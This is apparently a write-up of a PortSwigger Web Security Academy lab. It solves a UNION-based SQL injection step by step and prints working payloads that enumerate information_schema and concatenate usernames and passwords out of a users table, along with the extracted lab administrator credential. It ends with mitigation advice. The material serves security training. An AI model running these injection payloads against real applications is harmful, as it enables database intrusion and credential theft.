# SQL Injection UNION Attack - String Concatenation on MySQL/PostgreSQL

**Platform:** PortSwigger Web Security Academy  
**Category:** SQL Injection  
**Difficulty:** Practitioner  
**Date:** March 2026

---

## Objective

Extract usernames and passwords using string concatenation when only one column accepts text data, working with a MySQL or PostgreSQL database.

---

## Vulnerability

The application is vulnerable to UNION-based SQL injection. This lab combines two challenges:
1. **Only one column accepts text** (column 2)
2. **MySQL/PostgreSQL database** (uses `information_schema`)

**Backend Query Structure:**
```sql
SELECT id, description FROM products WHERE category = 'USER_INPUT'
```
- Column 1 (`id`): Integer — does NOT accept text
- Column 2 (`description`): Text — accepts strings

**Developer Mistake:**  
- **No input sanitization** allowing SQL injection
- **Mixed data types** requiring concatenation strategy
- **Access to information_schema** enabling full enumeration
- **No output filtering** on concatenated results

---

## My Attack Methodology

### 🔵 Step 1: Find Number of Columns

**Payload:**
```sql
' UNION SELECT NULL,NULL--
```

**Why this step:**
- Standard column enumeration
- No `FROM dual` needed — this is MySQL/PostgreSQL, not Oracle

**Result:** ✅ 2 columns confirmed

**Resulting SQL:**
```sql
SELECT id, description FROM products WHERE category = ''
UNION
SELECT NULL, NULL--'
```

---

### 🔵 Step 2: Identify Text Column

**Payload:**
```sql
' UNION SELECT NULL,'a'--
```

**Why this step:**
- Testing which column accepts text
- Placed string in column 2 → it appeared on page
- This tells me column 1 is likely integer, column 2 is text

**Result:** ✅ Only column 2 accepts text

**Resulting SQL:**
```sql
SELECT id, description FROM products WHERE category = ''
UNION
SELECT NULL, 'a'--'
```

**Key Finding:** All subsequent queries must put data in column 2, with NULL in column 1.

---

### 🔵 Step 3: Enumerate Table Names

**Payload:**
```sql
' UNION SELECT NULL,table_name FROM information_schema.tables--
```

**Why this step:**
- Looking for the users table
- Using `information_schema` (MySQL/PostgreSQL metadata)
- `table_name` goes in column 2 (text column)

**Result:** Found target table: `users` 🎯

**Resulting SQL:**
```sql
SELECT id, description FROM products WHERE category = ''
UNION
SELECT NULL, table_name FROM information_schema.tables--'
```

**What I saw:**
```
products
sessions
users    ← Target!
...
```

---

### 🔵 Step 4: Enumerate Column Names

**Payload:**
```sql
' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users'--
```

**Why this step:**
- Need column names from the users table
- Filtering by `table_name='users'` to narrow results
- `column_name` in column 2 (text column)

**Result:** Found columns: `username` and `password` 🎯

**Resulting SQL:**
```sql
SELECT id, description FROM products WHERE category = ''
UNION
SELECT NULL, column_name FROM information_schema.columns
WHERE table_name='users'--'
```

**What I saw:**
```
username
password
```

---

### 🔵 Step 5: Extract Credentials with Concatenation

**Payload:**
```sql
' UNION SELECT NULL, username || '~' || password FROM users--
```

**Why this step:**
- Have table and column names
- **Cannot use two columns** — only column 2 accepts text
- **Concatenate using `||` operator** (PostgreSQL/Oracle syntax)
- Use `~` as separator for parsing later

**Result:** 💥 Credentials extracted!

**Resulting SQL:**
```sql
SELECT id, description FROM products WHERE category = ''
UNION
SELECT NULL, username || '~' || password FROM users--'
```

**Extracted Data:**
```
administrator~hmk9yyqsby9w5ddyei36
```

**Parsed:**
- Username: `administrator`
- Password: `hmk9yyqsby9w5ddyei36`

---

### 🔵 Step 6: Log In as Administrator

**Action:**
- Split concatenated result by `~` separator
- Used credentials to log in

**Result:** ✅ Lab solved!

---

## Complete Attack Flow Visualization

```
Step 1: ' UNION SELECT NULL,NULL--
        ↓
        ✅ 2 columns exist

Step 2: ' UNION SELECT NULL,'a'--
        ↓
        ✅ Only column 2 accepts text

Step 3: ' UNION SELECT NULL,table_name FROM information_schema.tables--
        ↓
        ✅ Found table: users

Step 4: ' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users'--
        ↓
        ✅ Found columns: username, password

Step 5: ' UNION SELECT NULL, username || '~' || password FROM users--
        ↓
        💥 Concatenated: administrator~hmk9yyqsby9w5ddyei36

Step 6: Parse and authenticate
        ↓
        🎯 Lab solved!
```

---

## PostgreSQL Concatenation Syntax

### Using || Operator (What I Used):
```sql
' UNION SELECT NULL, username || '~' || password FROM users--
```

### Alternative - CONCAT() Function:
```sql
' UNION SELECT NULL, CONCAT(username, '~', password) FROM users--
```

Both work on PostgreSQL. The `||` operator also works on Oracle.

---

## Comparison: Lab 10 vs Lab 11

### Similarities:
- Both require string concatenation
- Both have only one text column
- Both extract username and password together
- Both use the same methodology

### Differences:

| Aspect | Lab 10 (Previous) | Lab 11 (This Lab) |
|--------|-------------------|-------------------|
| **Database** | Could be any | MySQL/PostgreSQL |
| **Metadata** | `information_schema` | `information_schema` |
| **Table name** | Randomized suffix | Simple `users` |
| **Complexity** | More obfuscation | Cleaner structure |

---

## What I Learned

1. **Concatenation is universal** — same technique across MySQL, PostgreSQL, Oracle
2. **|| operator is portable** — works on PostgreSQL and Oracle (not MySQL)
3. **Always identify text columns first** — saves time on failed attempts
4. **Separators matter** — `~` chosen because it's rare in password data
5. **Methodology stays consistent** — columns → tables → columns → data

---

## MySQL Alternative Syntax

If this were MySQL instead of PostgreSQL, the concatenation would use `CONCAT()`:

```sql
-- PostgreSQL/Oracle (what I used)
' UNION SELECT NULL, username || '~' || password FROM users--

-- MySQL equivalent
' UNION SELECT NULL, CONCAT(username, '~', password) FROM users--
```

Both achieve the same result, just different syntax.

---

## Real-World Application

### When You Encounter This:

**Indicators only one column accepts text:**
```sql
-- Try both columns with text
' UNION SELECT 'a','b'--
❌ Error: data type mismatch

-- Try column 1 only
' UNION SELECT 'a',NULL--
❌ Error: data type mismatch

-- Try column 2 only
' UNION SELECT NULL,'a'--
✅ Success!
```

**Solution:** Put all extracted data in the working text column using concatenation.

---

## Mitigation

**For Developers:**
- Use **parameterized queries** (prepared statements) — primary defense
- Apply **strict input validation** — reject SQL metacharacters
- **Restrict database permissions** — revoke `information_schema` access
- Implement **output encoding** — prevent raw database output
- Use **stored procedures** with parameterized inputs

**Example Fix (Python):**
```python
# ❌ Vulnerable
query = f"SELECT id, description FROM products WHERE category = '{user_input}'"

# ✅ Secure
query = "SELECT id, description FROM products WHERE category = ?"
cursor.execute(query, (user_input,))
```